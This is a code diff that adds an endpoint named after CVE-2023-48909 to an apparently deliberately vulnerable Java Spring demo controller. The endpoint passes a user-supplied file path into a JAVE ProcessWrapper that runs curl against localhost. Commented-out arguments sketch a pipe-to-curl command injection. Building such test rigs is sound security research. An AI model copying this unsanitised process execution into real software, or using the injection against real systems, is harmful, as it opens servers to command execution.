@@ -14,6 +14,7 @@ import com.jd.sec_api.SecApi;
 import liquibase.changelog.ChangeLogParameters;
 import liquibase.parser.core.xml.XMLChangeLogSAXParser;
 import liquibase.sdk.resource.MockResourceAccessor;
+import ws.schild.jave.process.ProcessWrapper;
 
 import org.slf4j.ext.EventData;
 import org.springframework.boot.autoconfigure.batch.BatchProperties.Job;
@@ -30,6 +31,7 @@ import org.apache.commons.beanutils.BeanUtils;
 //import org.w3c.dom.Document;
 //import org.w3c.dom.NodeList;
 
+import java.io.BufferedReader;
 //conf import org.apache.hadoop.mapred.JobConf;
 //conf import org.apache.hadoop.mapred.JobHistory.JobInfo;
 //import javax.naming.*;
@@ -92,6 +94,8 @@ import javax.xml.stream.XMLStreamReader;
 import javax.xml.transform.Source;
 //conf import javax.xml.xquery.*;
 import java.io.InputStream;
+import java.io.InputStreamReader;
+import java.io.OutputStream;
 import java.io.Reader;
 import java.lang.reflect.InvocationTargetException;
 import java.util.TimeZone;
@@ -240,6 +244,52 @@ public class DemoController {
         } catch (Exception e) {
             // 处理异常，可能是因为类不存在，或者没有实现期望的接口，或者有其他的安全措施阻止了攻击
             e.printStackTrace();
+        }
+    }
+    @PostMapping("/CVE202348909")
+    public void CVE202348909(String inputFilePath) throws IOException {
+
+        String ffmpegExecutablePath = "curl";
+        String outputFilePath = "/Users/D0L1/test/2.mp4";
+
+        ProcessWrapper processWrapper = new ProcessWrapper(ffmpegExecutablePath);
+        processWrapper.addArgument("127.0.0.1:9999/test");
+        processWrapper.addArgument(inputFilePath);
+        processWrapper.addArgument("-c:v");
+        processWrapper.addArgument("copy");
+        processWrapper.addArgument("-c:a");
+        processWrapper.addArgument("aac");
+        processWrapper.addArgument(outputFilePath);
+//        processWrapper.addArgument("-h");
+//        processWrapper.addArgument("|");
+//        processWrapper.addArgument("curl");
+//        processWrapper.addArgument("http://127.0.0.1:8000");
+        System.out.println(processWrapper);
+
+        InputStream errorStream = null;
+        try {
+            processWrapper.execute();
+
+            Thread.sleep(10000);
+
+            InputStream inputStream = processWrapper.getInputStream();
+            OutputStream outputStream = processWrapper.getOutputStream();
+            errorStream = processWrapper.getErrorStream();
+
+
+            System.out.println(inputStream);
+            System.out.println(outputStream);
+            processWrapper.close();
+
+
+        } catch (Exception e) {
+            e.printStackTrace();
+            BufferedReader errorReader = new BufferedReader(new InputStreamReader(errorStream));
+            String line;
+            while ((line = errorReader.readLine()) != null) {
+                System.err.println(line);
+            }
+
         }
     }
     @RequestMapping(path = "/permit/{value}")
